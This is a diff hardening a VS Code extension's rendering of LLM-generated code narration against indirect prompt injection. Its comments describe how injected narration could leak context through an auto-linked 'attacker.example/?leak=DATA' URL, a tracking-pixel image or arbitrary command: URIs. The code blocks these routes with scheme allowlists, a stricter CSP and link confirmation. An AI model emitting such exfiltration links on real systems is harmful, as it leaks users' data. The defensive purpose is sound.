@@ -2,8 +2,81 @@ import * as vscode from 'vscode';
 import * as crypto from 'crypto';
 import MarkdownIt from 'markdown-it';
 
-const md = new MarkdownIt({ html: false, linkify: true, breaks: false });
-md.validateLink = (url: string) => /^(https?:|command:|vscode:|file:|mailto:)/i.test(url);
+// `linkify: false` so plain-text URLs in narration prose are NOT auto-converted
+// to `<a>` tags. Otherwise an LLM emitting `Read more at https://attacker.example/?leak=DATA`
+// in flowing prose (no explicit markdown link syntax required) renders as a
+// clickable anchor — a one-click exfil channel reachable via the same indirect-
+// prompt-injection chain as #68/#91. Explicit `[text](url)` markdown still
+// produces a working link; that path is gated by `openExternal` confirmation
+// in the webview script (see `renderShell`).
+const md = new MarkdownIt({ html: false, linkify: false, breaks: false });
+
+/**
+ * Allowlist for markdown link URLs inside narration output. Narration is
+ * LLM-generated and indirectly influenced by the source files being narrated,
+ * so the link surface has to be treated as adversarial input.
+ *
+ * Permitted:
+ * - `http(s):` and `mailto:` — standard outbound links.
+ * - `command:codeNarration.reveal?…` — produced by `fixupLinks` to wire
+ *   heading and inline links to the reveal handler.
+ *
+ * Rejected (downgraded to plain text by markdown-it):
+ * - Any other `command:` URI — would otherwise execute arbitrary VS Code
+ *   commands (terminal-send, settings, file open, etc.) on click.
+ *   The webview also runs with `enableCommandUris: ['codeNarration.reveal']`,
+ *   so a renderer regression here still cannot fire foreign commands.
+ * - `file:` — clickable disclosure of any file the VS Code process can read.
+ * - `vscode:` — pivots through other installed extensions' URL handlers.
+ */
+export function isAllowedLinkUrl(url: string): boolean {
+    if (/^https?:/i.test(url)) return true;
+    if (/^mailto:/i.test(url)) return true;
+    if (/^command:codeNarration\.reveal\?/i.test(url)) return true;
+    return false;
+}
+
+// markdown-it routes every `<a href>` AND every `<img src>` through one
+// `validateLink` gate, so the predicate is the union of what's safe as a link
+// and what's safe as an image. The renderer-rule override below adds a second
+// gate that ensures `data:image/` only ever becomes an `<img>` — not an `<a>`
+// that surprises the user, and not a non-image `data:` URI.
+md.validateLink = (url: string) => isAllowedLinkUrl(url) || isAllowedImageSrc(url);
+
+/**
+ * Allowlist for markdown image `src` URLs. Distinct from `isAllowedLinkUrl`
+ * because images are auto-fetched on render — no user click required — so the
+ * allowlist must be strictly tighter:
+ *
+ * Permitted:
+ * - `data:image/...` URIs (inline base64, no network fetch).
+ *
+ * Rejected (the `<img>` tag is dropped at render time, alt text is rendered
+ * as escaped plain text instead):
+ * - `https?:` — would fire a `GET` to an attacker-controlled URL on render,
+ *   leaking whatever the LLM has in context. The webview's CSP also drops
+ *   `https:` from `img-src`, so a renderer regression would still be refused
+ *   at fetch time.
+ * - Any other scheme.
+ */
+export function isAllowedImageSrc(src: string): boolean {
+    return /^data:image\//i.test(src);
+}
+
+// Replace markdown-it's default image renderer with one that drops any
+// <img> whose src is not in `isAllowedImageSrc`. The alt text is preserved
+// as escaped plain text so the reader still sees that something was there.
+const defaultImageRule = md.renderer.rules.image;
+md.renderer.rules.image = (tokens, idx, opts, env, self) => {
+    const src = tokens[idx].attrGet('src') ?? '';
+    if (!isAllowedImageSrc(src)) {
+        const alt = tokens[idx].content;
+        return alt ? `[image: ${md.utils.escapeHtml(alt)}]` : '';
+    }
+    return defaultImageRule
+        ? defaultImageRule(tokens, idx, opts, env, self)
+        : self.renderToken(tokens, idx, opts);
+};
 
 export interface SpeechConfig {
     enabled: boolean;
@@ -198,7 +271,7 @@ const SPEECH_CLIENT_JS = `
     window.__speech = { enabled: false, onReset: function () {}, onMessage: function () {}, speakSection: function () {} };
     return;
   }
-  const vscodeApi = typeof acquireVsCodeApi === 'function' ? acquireVsCodeApi() : null;
+  const vscodeApi = window.__vscodeApi || null;
   function postToHost(msg) { if (vscodeApi) vscodeApi.postMessage(msg); }
   const synth = window.speechSynthesis;
   // Sections, in order. Each: { id, sentences: string[], done: boolean }.
@@ -474,7 +547,12 @@ export function renderShell(
         `default-src 'none'`,
         `style-src ${webview.cspSource} 'unsafe-inline'`,
         `script-src 'nonce-${nonce}'`,
-        `img-src ${webview.cspSource} https: data:`,
+        // No `https:` here — narration never legitimately renders remote
+        // images, and allowing them turns an attacker-influenced `<img>` tag
+        // into a no-click exfiltration channel (LLM emits a tracking pixel
+        // whose URL encodes context, browser fetches on render). Pairs with
+        // the markdown image renderer override in `isAllowedImageSrc`.
+        `img-src ${webview.cspSource} data:`,
     ].join('; ');
 
     return `<!DOCTYPE html>
@@ -493,6 +571,10 @@ ${banner(bannerLabel, speechConfig)}
 </div>
 <script nonce="${nonce}">
   window.__speechConfig = ${JSON.stringify(speechConfig)};
+  // acquireVsCodeApi may only be called once per webview lifecycle. Hoisting
+  // the call here lets both the speech client and the link-intercept script
+  // share the same handle.
+  window.__vscodeApi = (typeof acquireVsCodeApi === 'function') ? acquireVsCodeApi() : null;
 </script>
 <script nonce="${nonce}">${SPEECH_CLIENT_JS}</script>
 <script nonce="${nonce}">
@@ -554,6 +636,22 @@ ${banner(bannerLabel, speechConfig)}
       if (!(target instanceof HTMLElement)) return;
       const sectionId = target.getAttribute('data-speak-section');
       if (sectionId && window.__speech) window.__speech.speakSection(sectionId);
+
+      // Intercept clicks on external links so the extension can show the
+      // full URL and ask for confirmation before opening. Narration is
+      // LLM-generated and partly attacker-influenced, so a link's text and
+      // its href can be wildly different; the confirmation step makes the
+      // href visible at the consent moment. See #94.
+      const anchor = target.closest('a');
+      if (anchor && anchor instanceof HTMLAnchorElement) {
+        const href = anchor.getAttribute('href') || '';
+        if (/^https?:/i.test(href) || /^mailto:/i.test(href)) {
+          e.preventDefault();
+          if (window.__vscodeApi) {
+            window.__vscodeApi.postMessage({ kind: 'openExternal', url: href });
+          }
+        }
+      }
     });
   })();
 </script>
@@ -571,7 +669,12 @@ export function renderError(
     const csp = [
         `default-src 'none'`,
         `style-src ${webview.cspSource} 'unsafe-inline'`,
-        `img-src ${webview.cspSource} https: data:`,
+        // No `https:` here — narration never legitimately renders remote
+        // images, and allowing them turns an attacker-influenced `<img>` tag
+        // into a no-click exfiltration channel (LLM emits a tracking pixel
+        // whose URL encodes context, browser fetches on render). Pairs with
+        // the markdown image renderer override in `isAllowedImageSrc`.
+        `img-src ${webview.cspSource} data:`,
     ].join('; ');
     const hintHtml = hint ? `<p>${escapeHtml(hint)}</p>` : '';
     return `<!DOCTYPE html>
